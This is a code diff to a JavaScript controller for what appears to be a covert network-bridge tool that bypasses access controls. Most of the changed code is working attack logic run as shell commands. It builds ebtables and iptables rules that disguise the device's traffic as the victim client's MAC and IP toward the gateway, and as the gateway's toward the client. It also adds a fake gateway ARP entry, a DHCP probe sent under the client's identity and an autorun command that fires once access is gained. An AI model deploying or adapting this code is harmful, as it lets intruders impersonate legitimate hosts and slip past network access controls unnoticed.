@@ -1,5 +1,6 @@
 const EventEmitter = require('events')
 const fs = require('fs')
+const interfaces = require('os').networkInterfaces()
 
 var full_log = fs.createWriteStream(__dirname + '/logs/history.log', {flags : 'a'})
 var current_log = fs.createWriteStream(__dirname + '/logs/current.log', {flags : 'w'})
@@ -44,6 +45,16 @@ class BridgeController extends EventEmitter {
     this.autorun_command = config.autorun_command
     this.gateway_side_interface = ''
     this.client_side_interface = ''
+    this.int_to_mac = {}
+    this.int_to_mac[this.nic1] = execSync(`cat /sys/class/net/${this.nic1}/address`, {"timeout": 10000}).toString().trim()
+    this.int_to_mac[this.nic2] = execSync(`cat /sys/class/net/${this.nic2}/address`, {"timeout": 10000}).toString().trim()
+  }
+
+  //I don't love this method. But it seems consistent and ebtables postrouting rules based on source mac seem to work better than other attempts at NATing based on destination 
+  get_int_for_smac(mac_addr){
+     let if_number = execSync(`brctl showmacs ${this.bridge_name}| grep ${mac_addr} | awk '{print $1}'`, {"timeout": 10000}).toString().trim()
+     let interface_name = execSync(`brctl showstp ${this.bridge_name} | grep '(${if_number})' | head -n1 | awk '{print $1}'`, {"timeout": 10000}).toString().trim()
+     return interface_name
   }
 
   start_bridge(){
@@ -52,9 +63,25 @@ class BridgeController extends EventEmitter {
     //os_cmd('Enforce arptables on the bridge', `sysctl -w net.bridge.bridge-nf-call-arptables=1`)
     //os_cmd('Enforce ip6 tables on the bridge', `sysctl -w net.bridge.bridge-nf-call-ip6tables=1`)
     //os_cmd('Enforce iptables on the bridge', `sysctl -w net.bridge.bridge-nf-call-iptables=1`)
-    os_cmd('Drop broadcast traffic from our device', `ebtables -t filter -A OUTPUT -s ${this.bridge_mac} -d ff:ff:ff:ff:ff:ff -j DROP`)
-    os_cmd('Drop multicast traffic from our device', `ebtables -t filter -A OUTPUT -s ${this.bridge_mac} -d 01:00:5e:00:00:01 -j DROP`)
-    os_cmd('Drop ipv6 multicast traffic from our device', `ebtables -t filter -A OUTPUT -s ${this.bridge_mac} -d 33:33:00:00:00:01 -j DROP`)
+//    os_cmd('Drop broadcast traffic from our device', `ebtables -t filter -A OUTPUT -s ${this.bridge_mac} -d ff:ff:ff:ff:ff:ff -j DROP`)
+//    os_cmd('Drop multicast traffic from our device', `ebtables -t filter -A OUTPUT -s ${this.bridge_mac} -d 01:00:5e:00:00:01 -j DROP`)
+//    os_cmd('Drop ipv6 multicast traffic from our device', `ebtables -t filter -A OUTPUT -s ${this.bridge_mac} -d 33:33:00:00:00:01 -j DROP`)
+    os_cmd('Use "policy" to allow loopback traffic', `iptables -A OUTPUT -o lo -j ACCEPT`)
+    os_cmd('Use "policy" to drop all outbound IP traffic from our device', `iptables -P OUTPUT DROP`)
+    os_cmd('Use "policy" to drop all outbound Ethernet traffic from our device', `ebtables -P OUTPUT DROP`)
+    os_cmd('Use "policy" to drop all outbound ARP traffic from our device', `arptables -P OUTPUT DROP`)
+    for(const iface in interfaces){
+      if(![this.bridge_name, this.nic1, this.nic2].includes(iface)){
+        os_cmd('Allow communication on interfaces not used in the attack', `ebtables -A OUTPUT -o ${iface} -j ACCEPT`)
+        os_cmd('Allow communication on interfaces not used in the attack', `iptables -A OUTPUT -o ${iface} -j ACCEPT`)
+        os_cmd('Allow communication on interfaces not used in the attack', `arptables -A OUTPUT -o ${iface} -j ACCEPT`)
+      }
+    }
+    //https://en.wikipedia.org/wiki/EtherType
+    os_cmd('Additional granular block on other ARP types', `ebtables -A OUTPUT -p 0x0806 -j DROP`)
+    os_cmd('Additional granular block on other ARP types', `ebtables -A OUTPUT -p 0x0808 -j DROP`)
+    os_cmd('Additional granular block on other ARP types', `ebtables -A OUTPUT -p 0x8035 -j DROP`)
+    os_cmd('Additional granular block on other ARP types', `ebtables -A OUTPUT -p 0x80F3 -j DROP`)
     os_cmd('Stop netmanager from trying to manage nic1', `nmcli d set ${this.nic1} managed no`)
     os_cmd('Stop netmanager from trying to manage nic2', `nmcli d set ${this.nic2} managed no`)
     os_cmd('Allow arp filters on bridge', `modprobe arptable_filter`)
@@ -73,9 +100,9 @@ class BridgeController extends EventEmitter {
     os_cmd('Add nic2 to bridge', `brctl addif ${this.bridge_name} ${this.nic2}`)
     os_cmd('Give the bridge an IP in the APIPA range', `ip addr add ${this.bridge_ip}/16 dev ${this.bridge_name}`)
     os_cmd('Set the bridge MAC to a known value', `ip link set dev ${this.bridge_name} address ${this.bridge_mac} arp off`)
-    os_cmd('Drop all outbound ARP from our device', `arptables -A OUTPUT -o ${this.bridge_name} -j DROP`)
-    os_cmd('Drop all outbound TCP/UDP from our device for now', `iptables -A OUTPUT -o ${this.bridge_name} -j DROP`)
-    os_cmd('Drop all outbound ethernet multicast from our device for now', `ebtables -A OUTPUT -o ${this.bridge_name} -d Multicast -j DROP`)
+    //os_cmd('Drop all outbound ARP from our device', `arptables -A OUTPUT -o ${this.bridge_name} -j DROP`)
+    //os_cmd('Drop all outbound TCP/UDP from our device for now', `iptables -A OUTPUT -o ${this.bridge_name} -j DROP`)
+    //os_cmd('Drop all outbound ethernet multicast from our device for now', `ebtables -A OUTPUT -o ${this.bridge_name} -d Multicast -j DROP`)
     os_cmd('Turn on the bridge interface', `ip link set dev ${this.bridge_name} up`)
     os_cmd('Ensure nic1 is up', `ip link set dev ${this.nic1} up`)
     os_cmd('Ensure nic2 is up', `ip link set dev ${this.nic2} up`)
@@ -125,12 +152,21 @@ class BridgeController extends EventEmitter {
   }
 
   flush_tables(shutdown){
+    os_cmd('Clear ebtables policy',`ebtables -F`)
     os_cmd('Clear ebtables rules',`ebtables -t filter -F`)
     os_cmd('Clear ebtables NAT rules',`ebtables -t nat -F`)
+    os_cmd('Clear iptables policy',`iptables -F`)
     os_cmd('Clear iptables filters',`iptables -t filter -F`)
     os_cmd('Clear iptables NAT rules',`iptables -t nat -F`)
     os_cmd('Clear iptables mangle rules',`iptables -t mangle -F`)
     os_cmd('Clear iptables rules',`iptables -t raw -F`)
+    for(const iface in interfaces){
+      if(![this.bridge_name, this.nic1, this.nic2].includes(iface)){
+        os_cmd('Allow communication on interfaces not used in the attack', `ebtables -A OUTPUT -o ${iface} -j ACCEPT`)
+        os_cmd('Allow communication on interfaces not used in the attack', `iptables -A OUTPUT -o ${iface} -j ACCEPT`)
+        os_cmd('Allow communication on interfaces not used in the attack', `arptables -A OUTPUT -o ${iface} -j ACCEPT`)
+      }
+    }
     this.stop_bridge(shutdown)
   }
   
@@ -151,15 +187,38 @@ class BridgeController extends EventEmitter {
   }
 
   spoof_client_to_gateway(info){
-    os_cmd('Tag all traffic from the bridge not destined for the client with the client\'s mac',
-      `ebtables -t nat -A POSTROUTING -s ${this.bridge_mac} ! -d ${info.client_mac} -j snat --snat-arp --to-source ${info.client_mac}`)
-    os_cmd('Tag all tcp traffic from the bridge not destined for the client with the client\'s ip',
-      `iptables -t nat -A POSTROUTING -p tcp -s ${this.bridge_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
-    os_cmd('Tag udp tcp traffic from the bridge not destined for the client with the client\'s ip',
-      `iptables -t nat -A POSTROUTING -p udp -s ${this.bridge_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
-    os_cmd('Tag icmp tcp traffic from the bridge not destined for the client with the client\'s ip',
-      `iptables -t nat -A POSTROUTING -p icmp -s ${this.bridge_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}`)
-    os_cmd('Drop all inbound DHCP requests from our management subnet', `iptables -t filter -I FORWARD -p udp -s ${this.mgmt_subnet} --dport 67 -j DROP`)
+    //get the interface that is facing the network
+    this.gateway_side_interface = this.get_int_for_smac(info.gateway_mac)
+    os_cmd('Tag all communication leaving the bridge towards the switch with the client\'s MAC address',
+      `ebtables -t nat -A POSTROUTING -s ${this.int_to_mac[this.gateway_side_interface]} -o ${this.gateway_side_interface} -j snat --snat-arp --to-src ${info.client_mac}`)
+    //I've been burned by my bridge's mac before :(
+    os_cmd('Catch any traffic that might not be caught in the normal POSTROUTING chain',
+      `ebtables -t nat -A POSTROUTING -s ${this.bridge_mac} -o ${this.gateway_side_interface} -j snat --snat-arp --to-src ${info.client_mac}`)
+    //Mask TCP Traffic
+    os_cmd('Tag all traffic leaving the management subnet towards the switch with the client\'s IP and NAT using ephemeral ports 61000-62000 for tcp',
+      `iptables -t nat -A POSTROUTING -o ${this.bridge_name} -s ${this.mgmt_subnet} -p tcp -j SNAT --to ${info.client_ip}:61000-62000`)
+    os_cmd('Tag all traffic leaving the bridge towards the switch with the client\'s IP and NAT using ephemeral ports 61000-62000 for tcp',
+      `iptables -t nat -A POSTROUTING -o ${this.bridge_name} -s ${this.bridge_subnet} -p tcp -j SNAT --to ${info.client_ip}:61000-62000`)
+    //Mask UDP Traffic
+    os_cmd('Tag all traffic leaving the management subnet towards the switch with the client\'s IP and NAT using ephemeral ports 61000-62000 for udp',
+      `iptables -t nat -A POSTROUTING -o ${this.bridge_name} -s ${this.mgmt_subnet} -p udp -j SNAT --to ${info.client_ip}:61000-62000`)
+    os_cmd('Tag all traffic leaving the bridge towards the switch with the client\'s IP and NAT using ephemeral ports 61000-62000 for udp',
+      `iptables -t nat -A POSTROUTING -o ${this.bridge_name} -s ${this.bridge_subnet} -p udp -j SNAT --to ${info.client_ip}:61000-62000`)
+    //Mask iCMP Traffic
+    os_cmd('Tag all traffic leaving the management subnet towards the switch with the client\'s IP for icmp',
+      `iptables -t nat -A POSTROUTING -o ${this.bridge_name} -s ${this.mgmt_subnet} -p icmp -j SNAT --to ${info.client_ip}`)
+    os_cmd('Tag all traffic leaving the bridge towards the switch with the client\'s IP for icmp',
+      `iptables -t nat -A POSTROUTING -o ${this.bridge_name} -s ${this.bridge_subnet} -p icmp -j SNAT --to ${info.client_ip}`)
+
+//    os_cmd('Tag all traffic from the bridge not destined for the client with the client\'s mac',
+//      `ebtables -t nat -A POSTROUTING -s ${this.bridge_mac} ! -d ${info.client_mac} -j snat --snat-arp --to-source ${info.client_mac}`)
+//    os_cmd('Tag all tcp traffic from the bridge not destined for the client with the client\'s ip',
+//      `iptables -t nat -A POSTROUTING -p tcp -s ${this.bridge_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
+//    os_cmd('Tag udp tcp traffic from the bridge not destined for the client with the client\'s ip',
+//      `iptables -t nat -A POSTROUTING -p udp -s ${this.bridge_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
+//    os_cmd('Tag icmp tcp traffic from the bridge not destined for the client with the client\'s ip',
+//      `iptables -t nat -A POSTROUTING -p icmp -s ${this.bridge_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}`)
+//    os_cmd('Drop all inbound DHCP requests from our management subnet', `iptables -t filter -I FORWARD -p udp -s ${this.mgmt_subnet} --dport 67 -j DROP`)
     //we don't need to know the gateway's real IP to use it ;)
     os_cmd('Create a fake arp neighbor with an IP on our bridge that maps to the same mac as the real gateway',
       `ip neigh add ${this.virtual_gateway_ip} lladdr ${info.gateway_mac} dev ${this.bridge_name}`)
@@ -190,15 +249,20 @@ class BridgeController extends EventEmitter {
     }
     os_cmd('Allow ip forwarding so we can route from our management interface to the bridge',
       `echo 1 > /proc/sys/net/ipv4/ip_forward`)
-    os_cmd('Add management range to spoof rules for tcp',
-      `iptables -t nat -A POSTROUTING -p tcp -s ${this.mgmt_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
-    os_cmd('Add management range to spoof rules for udp',
-      `iptables -t nat -A POSTROUTING -p udp -s ${this.mgmt_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
-    os_cmd('Add management range to spoof rules for icmp',
-      `iptables -t nat -A POSTROUTING -p icmp -s ${this.mgmt_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}`)
-    os_cmd('Allow outbound ARP from our device', `arptables -D OUTPUT -o ${this.bridge_name} -j DROP`)
-    os_cmd('Allow outbound TCP/UDP from our device for now', `iptables -D OUTPUT -o ${this.bridge_name} -j DROP`)
-    os_cmd('Allow outbound ethernet multicast from our device for now', `ebtables -D OUTPUT -o ${this.bridge_name} -d Multicast -j DROP`)
+//    os_cmd('Add management range to spoof rules for tcp',
+//      `iptables -t nat -A POSTROUTING -p tcp -s ${this.mgmt_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
+//    os_cmd('Add management range to spoof rules for udp',
+//      `iptables -t nat -A POSTROUTING -p udp -s ${this.mgmt_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
+//    os_cmd('Add management range to spoof rules for icmp',
+//      `iptables -t nat -A POSTROUTING -p icmp -s ${this.mgmt_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}`)
+//    os_cmd('Allow outbound ARP from our device', `arptables -D OUTPUT -o ${this.bridge_name} -j DROP`)
+//    os_cmd('Allow outbound TCP/UDP from our device for now', `iptables -D OUTPUT -o ${this.bridge_name} -j DROP`)
+//    os_cmd('Allow outbound ethernet multicast from our device for now', `ebtables -D OUTPUT -o ${this.bridge_name} -d Multicast -j DROP`)
+     os_cmd('Open up communication between us and the switch',
+      `ebtables -A OUTPUT -o ${this.gateway_side_interface} -j ACCEPT`)
+     os_cmd('Allow traffic originating from us to leave the device on the bridge interface',
+      `iptables -A OUTPUT -o ${this.bridge_name} -s ${this.bridge_ip} -j ACCEPT`)
+      //`iptables -A OUTPUT -o ${this.bridge_name} -j ACCEPT`)
     //run a single command once we have network access
     if(this.run_command_on_success){
       os_cmd('Autorun command configured. Running:', this.autorun_command)
@@ -206,22 +270,48 @@ class BridgeController extends EventEmitter {
   }
 
   spoof_gateway_to_client(info){
-    os_cmd('Tag all traffic from the bridge to the client with the gateway\'s mac',
-      `ebtables -t nat -A POSTROUTING -s ${this.bridge_mac} -d ${info.client_mac} -j snat --to-source ${info.gateway_mac}`)
-    os_cmd('Tag all tcp traffic from the bridge to the client with the gateway\'s ip',
-      `iptables -t nat -A POSTROUTING -p tcp -s ${this.bridge_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
-    os_cmd('Tag all udp traffic from the bridge to the client with the gateway\'s ip',
-      `iptables -t nat -A POSTROUTING -p udp -s ${this.bridge_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
-    os_cmd('Tag all icmp traffic from the bridge to the client with the gateway\'s ip',
-      `iptables -t nat -A POSTROUTING -p icmp -s ${this.bridge_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}`)
-    os_cmd('Add management range to spoof rules for client connections over tcp',
-      `iptables -t nat -A POSTROUTING -p tcp -s ${this.mgmt_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
-    os_cmd('Add management range to spoof rules for client connections over udp',
-      `iptables -t nat -A POSTROUTING -p udp -s ${this.mgmt_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
-    os_cmd('Add management range to spoof rules for client connections over icmp',
-       `iptables -t nat -A POSTROUTING -p icmp -s ${this.mgmt_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}`)
+    this.client_side_interface = this.get_int_for_smac(info.client_mac)
+    os_cmd('Tag all communication from the bridge towards the client with the switch\'s MAC address',
+    `ebtables -t nat -A POSTROUTING -s ${this.int_to_mac[this.client_side_interface]} -o ${this.client_side_interface} -j snat --snat-arp --to-src ${info.gateway_mac}`)
+    //Mask TCP
+    os_cmd('Tag all communication from the bridge towards the client with the gateway\'s IP address and NAT using ephemeral ports 61000-62000 for tcp',
+      `iptables -t nat -A POSTROUTING -o ${this.bridge_name} -s ${this.bridge_subnet} -d ${info.client_ip} -p tcp -j SNAT --to ${info.gateway_ip}:61000-62000`)
+    os_cmd('Tag all communication from the management subnet towards the client with the gateway\'s IP address and NAT using ephemeral ports 61000-62000 for tcp',
+      `iptables -t nat -A POSTROUTING -o ${this.bridge_name} -s ${this.mgmt_subnet} -d ${info.client_ip} -p tcp -j SNAT --to ${info.gateway_ip}:61000-62000`)
+    //Mask UDP 
+    os_cmd('Tag all communication from the bridge towards the client with the gateway\'s IP address and NAT using ephemeral ports 61000-62000 for udp',
+      `iptables -t nat -A POSTROUTING -o ${this.bridge_name} -s ${this.bridge_subnet} -d ${info.client_ip} -p udp -j SNAT --to ${info.gateway_ip}:61000-62000`)
+    os_cmd('Tag all communication from the management subnet towards the client with the gateway\'s IP address and NAT using ephemeral ports 61000-62000 for tcp',
+      `iptables -t nat -A POSTROUTING -o ${this.bridge_name} -s ${this.mgmt_subnet} -d ${info.client_ip} -p udp -j SNAT --to ${info.gateway_ip}:61000-62000`)
+    //Mask ICMP
+    os_cmd('Tag all communication from the bridge towards the client with the gateway\'s IP address and NAT for icmp',
+      `iptables -t nat -A POSTROUTING -o ${this.bridge_name} -s ${this.bridge_subnet} -d ${info.client_ip} -p icmp -j SNAT --to ${info.gateway_ip}`)
+    os_cmd('Tag all communication from the management subnet towards the client with the gateway\'s IP address for icmp',
+      `iptables -t nat -A POSTROUTING -o ${this.bridge_name} -s ${this.mgmt_subnet} -d ${info.client_ip} -p icmp -j SNAT --to ${info.gateway_ip}`)
+    os_cmd('Open up communication with the client',
+      `ebtables -A OUTPUT -o ${this.client_side_interface} -j ACCEPT`)
+//    os_cmd('Tag all traffic from the bridge to the client with the gateway\'s mac',
+//      `ebtables -t nat -A POSTROUTING -s ${this.bridge_mac} -d ${info.client_mac} -j snat --to-source ${info.gateway_mac}`)
+//    os_cmd('Tag all tcp traffic from the bridge to the client with the gateway\'s ip',
+//      `iptables -t nat -A POSTROUTING -p tcp -s ${this.bridge_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
+//    os_cmd('Tag all udp traffic from the bridge to the client with the gateway\'s ip',
+//      `iptables -t nat -A POSTROUTING -p udp -s ${this.bridge_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
+//    os_cmd('Tag all icmp traffic from the bridge to the client with the gateway\'s ip',
+//      `iptables -t nat -A POSTROUTING -p icmp -s ${this.bridge_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}`)
+//    os_cmd('Add management range to spoof rules for client connections over tcp',
+//      `iptables -t nat -A POSTROUTING -p tcp -s ${this.mgmt_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
+//    os_cmd('Add management range to spoof rules for client connections over udp',
+//      `iptables -t nat -A POSTROUTING -p udp -s ${this.mgmt_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
+//    os_cmd('Add management range to spoof rules for client connections over icmp',
+//       `iptables -t nat -A POSTROUTING -p icmp -s ${this.mgmt_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}`)
   }
   
+  send_dhcp_probe(){
+    if((this.net_info.client_ip != '') && (this.net_info.client_mac != '')){
+      os_cmd('Send DCHP Probe While Spoofing the Client', `./discovery mibr ${this.net_info.client_mac} ${this.net_info.client_ip}`)
+    }
+  }
+
   update_dns(dns_servers){
     console.log(dns_servers)
     os_cmd('Clear dns settings', `> /etc/resolv.conf`)
